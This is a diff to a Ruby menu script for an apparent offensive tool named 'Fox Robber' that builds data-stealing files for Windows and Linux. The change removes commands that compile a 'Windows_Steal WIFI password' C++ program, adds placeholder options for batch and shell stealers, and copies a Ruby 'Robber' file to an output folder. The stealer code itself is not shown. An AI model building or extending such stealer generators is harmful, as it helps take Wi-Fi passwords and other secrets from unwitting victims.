@@ -46,18 +46,16 @@ while true
             case command_fox_robber
             when '4', 'windows'
               system('clear')
-              puts "What do you want:\n[9]. Python\n[10]. Ruby\n[11]. C++\n[0]. Back".green
+              puts "What do you want:\n[9]. Python\n[10]. Ruby\n[11]. Batch File\n[0]. Back".green
               job = 'fox-robber [windows]'
               print "\n(#{job})>".yellow
               command_windows = gets.chomp
               case command_windows
-              when '11', 'c++', 'cpp', 'cxx'
+              when '11', 'batch_file', 'batchfile', 'batch', 'bat'
                 puts 'Loading...'.blue
+
                 ### Need More work ###
-                system('g++ Windows/Windows_Steal\ WIFI\ password.cpp')
-                system('mv a.out Windows_Steal_WIFI_password')
-                system('chmod -r+x Windows_Steal_WIFI_password')
-                system('mv Windows_Steal_WIFI_password Out/')
+
                 puts 'File made by Fox Robber 🦊'.red
                 system("echo \"\t<Press enter>\" | lolcat -a")
                 gets.chomp
@@ -75,7 +73,7 @@ while true
           if %w[0 back].include?(command_fox_robber)
             break
           else
-            puts "What do you want:\n[9]. Python\n[10]. Ruby\n[0]. Back".green
+            puts "What do you want:\n[9]. Python\n[10]. Ruby\n[11]. Linux Shell\n[0]. Back".green
             job = 'fox-robber [linux]'
             print "\n(#{job})>".yellow
             command_linux = gets.chomp
@@ -91,8 +89,14 @@ while true
             when '10', 'Ruby'
               puts 'Loading...'.blue
               system('cp Linux/Robber.rb Out')
+              puts 'File made by Fox Robber 🦊'.red
+              system("echo \"\t<Press enter>\" | lolcat -a")
+              gets.chomp
+              break
+            when '11', 'Linux_shell', 'linuxshell', 'shell'
+              puts 'Loading...'.blue
 
-              ### Encoding ###
+              ### Need More work ###
 
               puts 'File made by Fox Robber 🦊'.red
               system("echo \"\t<Press enter>\" | lolcat -a")
